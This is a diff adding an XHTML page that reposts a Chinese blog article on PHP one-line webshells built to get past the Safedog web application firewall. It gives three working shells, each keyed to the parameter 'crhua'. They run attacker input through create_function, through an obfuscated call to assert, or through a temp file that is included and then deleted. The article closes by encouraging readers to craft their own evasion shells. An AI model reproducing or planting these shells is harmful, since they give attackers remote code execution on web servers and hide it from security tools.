@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>bypass-webshell总结</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>bypass-webshell总结</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzIyOTY1NDE5Mg==&amp;mid=2247483845&amp;idx=1&amp;sn=c03794485b44343c67cdfc32ff7f20ae&amp;chksm=e8be2a1adfc9a30cec2868567bd6720ccf34148eff21e53319b347ac0c36e8c1dc8f276b4332&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzIyOTY1NDE5Mg==&amp;mid=2247483845&amp;idx=1&amp;sn=c03794485b44343c67cdfc32ff7f20ae&amp;chksm=e8be2a1adfc9a30cec2868567bd6720ccf34148eff21e53319b347ac0c36e8c1dc8f276b4332&amp;scene=27#wechat_redirect</a></blockquote><p>昨晚有个大兄弟找我要过狗一句话，今天我就给大家分享下几个过狗一句话。另外推荐一篇我之前写的文章，移步到 <strong><strong>http://www.freebuf.com/articles/system/164076.html</strong>。</strong></p><p><strong>NO.1</strong></p><blockquote><p><strong>&lt;?php<br/>$pass = $_POST['crhua'];<br/>$a = create_function("",$pass);<br/>$a();</strong></p><p><strong>?&gt;<br/></strong></p></blockquote><p><strong><br/></strong></p><p><strong>NO.2</strong></p><blockquote><p><strong>&lt;?php<br/>$fruits = array("a" =&gt; "lemon", "ss" =&gt; "orange", "ssr" =&gt; "banana", "t" =&gt; "apple");<br/>function test_alter(&amp;$item1, $key, $prefix)<br/>{<br/> $item1 = "$prefix: $item1";<br/>}<br/>function test_print($item2, $key)<br/>{<br/> echo "$key. $item2&lt;br /&gt;\n";<br/>}<br/>echo "Before ...:\n";<br/>array_walk($fruits, 'test_print');<br/>$a =array_keys($fruits);<br/>print_r($a);<br/>$m =$a[0].$a[1];<br/>$n ='er';<br/>$q = $m.$n.'t'; //assert<br/>$r = $_REQUEST['crhua'];<br/>@$q($r);<br/>//密码crhua<br/>?&gt; <br/></strong></p></blockquote><p><strong><br/></strong></p><p><strong>NO.3</strong></p><blockquote><p><strong>&lt;?php<br/>error_reporting();<br/>$p = &lt;&lt;&lt;f<br/>&lt;?php<br/>\$crhua = \$_REQUEST['crhua'];<br/>function crhua(\$crhua){<br/>    array_map(create_function("", \$crhua), array(1));<br/>}<br/>crhua(\$crhua);<br/>?&gt;<br/>f;<br/><br/>$temp = tempnam(sys_get_temp_dir(), '');<br/>echo $temp;<br/>fwrite(fopen($temp, 'w'), $p);<br/>include $temp;<br/>unlink($temp);<br/>var_dump(file_exists($temp));<br/>?&gt;</strong></p></blockquote><p><strong><br/></strong></p><p><strong>总结</strong></p><p><strong>      </strong>  过狗一句话最简单得就是代码混淆，其次就是利用php一些函数进行绕过。看一下我在fb发的文章，然后自己总结下，属于自己的过狗一句话，指日可待。</p><p><strong>附：</strong>今天是比较多所以文章更新得晚，有木有在盒子挖洞的，希望能一起交流挖洞的艺术，当然如果有大佬能带带我这个小菜鸡也是很好的，哈哈<strong>。<br/></strong></p><p><br/></p><p>       <br/></p><p><br/></p>
+        
+</body>
+</html>
